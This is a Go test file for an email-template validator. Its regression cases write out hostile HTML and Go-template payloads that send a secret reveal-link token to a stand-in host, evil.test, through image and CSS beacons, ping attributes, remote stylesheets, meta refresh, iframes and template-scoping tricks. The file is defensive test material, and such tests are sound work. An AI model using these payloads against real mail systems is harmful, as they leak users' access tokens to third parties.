package mailtemplates_test

import (
	"context"
	"errors"
	"testing"

	"github.com/sched75/sealkeeper/internal/mailtemplates"
)

const safeText = "Open {{ .RevealURL }}\n"
const safeHTML = `<p><a href="{{ .RevealURL }}">open</a></p>`

// Regression: an admin (or a stolen admin session) could store a template
// that ships the live reveal token to a third party the moment the mail is
// opened or the button is clicked, or that loads remote tracking content.
func TestUpsertRejectsExfiltratingTemplates(t *testing.T) {
	t.Parallel()
	r := newRepo(t)
	cases := []struct {
		name, subject, text, html string
	}{
		{"img src carries token", "s", safeText,
			safeHTML + `<img src="https://evil.test/p.gif?t={{ .RevealURL }}">`},
		{"css url carries token", "s", safeText,
			safeHTML + `<div style="background:url('https://evil.test/{{ .RevealURL }}')">x</div>`},
		{"button points elsewhere", "s", safeText,
			`<a href="https://evil.test/r?u={{ .RevealURL }}">open</a>`},
		{"token in link text", "s", safeText,
			safeHTML + `<p>{{ .RevealURL }}</p>`},
		{"token in title attribute", "s", safeText,
			`<a href="{{ .RevealURL }}" title="{{ .RevealURL }}">open</a>`},
		{"ping attribute", "s", safeText,
			`<a href="{{ .RevealURL }}" ping="https://evil.test/ping">open</a>`},
		{"remote tracking pixel", "s", safeText,
			safeHTML + `<img src="https://evil.test/pixel.gif" alt="">`},
		{"protocol-relative image", "s", safeText,
			safeHTML + `<img src="//evil.test/pixel.gif" alt="">`},
		{"remote stylesheet", "s", safeText,
			`<link rel="stylesheet" href="https://evil.test/a.css">` + safeHTML},
		{"style block import", "s", safeText,
			`<style>@import "https://evil.test/a.css";</style>` + safeHTML},
		{"css url without token", "s", safeText,
			`<div style="background-image:url(https://evil.test/bg.png)">` + safeHTML + `</div>`},
		{"css escape", "s", safeText,
			`<div style="background-image:u\72l(https://evil.test/bg.png)">` + safeHTML + `</div>`},
		{"meta refresh", "s", safeText,
			`<meta http-equiv="refresh" content="0;url=https://evil.test/">` + safeHTML},
		{"iframe", "s", safeText,
			safeHTML + `<iframe src="https://evil.test/"></iframe>`},
		{"token in subject", "Link {{ .RevealURL }}", safeText, safeHTML},
		{"token glued in text", "s", "https://evil.test/?u={{ .RevealURL }}\n", safeHTML},
		{"token piped in text", "s", `{{ .RevealURL | printf "%s" }}`, safeHTML},
		{"token sliced", "s", safeText,
			`<a href="{{ .RevealURL }}">x</a><img src="https://evil.test/{{ slice .RevealURL 8 }}">`},
		{"whole dot printed", "s", safeText,
			safeHTML + `<img src="https://evil.test/?{{ . }}">`},
		{"whole dot in text", "s", "{{ . }}\n", safeHTML},
		{"root variable", "s", "{{ $.RevealURL }}x\n", safeHTML},
		{"with rebinds dot", "s", "{{ with .RevealURL }}{{ . }}{{ end }}\n", safeHTML},
		{"defined sub-template", "s", safeText,
			`{{ define "x" }}<img src="https://evil.test/?{{ .RevealURL }}">{{ end }}` + safeHTML + `{{ template "x" . }}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := r.Upsert(context.Background(), mailtemplates.KindRevealLink, "en",
				c.subject, c.text, c.html, nil)
			if !errors.Is(err, mailtemplates.ErrUnsafe) {
				t.Fatalf("Upsert err = %v, want ErrUnsafe", err)
			}
			if !errors.Is(err, mailtemplates.ErrParse) {
				t.Fatalf("Upsert err = %v, want it to wrap ErrParse too", err)
			}
		})
	}
}

func TestUpsertAcceptsSafeCustomTemplates(t *testing.T) {
	t.Parallel()
	r := newRepo(t)
	html := `<html><head><meta charset="utf-8"><style>p{color:#7A1F2B}</style></head><body>
<p style="color:#1A1814">{{ .InstanceName }} for {{ .UserEmail }}</p>
<p><a href="{{ .RevealURL }}" style="background:#7A1F2B">Open</a></p>
{{ if .ContactURL }}<a href="{{ .ContactURL }}">help</a>{{ end }}
<img src="data:image/png;base64,iVBORw0KGgo=" alt=""></body></html>`
	text := "Hello {{ .UserEmail }},\n\n{{ .RevealURL }}\n\n<{{ .RevealURL }}>\nValid {{ .ValidityMinutes }} min.\n"
	if err := r.Upsert(context.Background(), mailtemplates.KindRevealLink, "en",
		"Your {{ .InstanceName }} link", text, html, nil); err != nil {
		t.Fatalf("Upsert: %v", err)
	}
}

// Every shipped default must clear the same bar: no remote resource, no
// tracking, the reveal URL only as a link target.
func TestSystemDefaultsAreSafe(t *testing.T) {
	t.Parallel()
	r := mailtemplates.NewRepo(nil)
	for _, k := range mailtemplates.AllKinds() {
		for _, l := range mailtemplates.SupportedLanguages() {
			tpl, err := r.Get(context.Background(), k, l)
			if err != nil {
				t.Fatal(err)
			}
			if err := mailtemplates.ValidateTemplates(tpl.Subject, tpl.Text, tpl.HTML); err != nil {
				t.Errorf("%s/%s: %v", k, l, err)
			}
		}
	}
}

// A row written before the check existed (or straight into the DB) is
// refused at send time, so the token never leaves in a hostile template.
func TestRenderRefusesUnsafeStoredRow(t *testing.T) {
	t.Parallel()
	r, db := newRepoDB(t)
	if _, err := db.Exec(`INSERT INTO email_templates
		(kind, language, subject, text_body, html_body, created_at, updated_at)
		VALUES ('reveal_link', 'en', 's', 'x', '<img src="https://evil.test/{{ .RevealURL }}">', '2026-01-01 00:00:00', '2026-01-01 00:00:00')`); err != nil {
		t.Fatal(err)
	}
	_, err := r.Render(context.Background(), mailtemplates.KindRevealLink, "en",
		mailtemplates.Vars{RevealURL: "https://sk.test/reveal/abc"})
	if !errors.Is(err, mailtemplates.ErrUnsafe) {
		t.Fatalf("Render err = %v, want ErrUnsafe", err)
	}
}
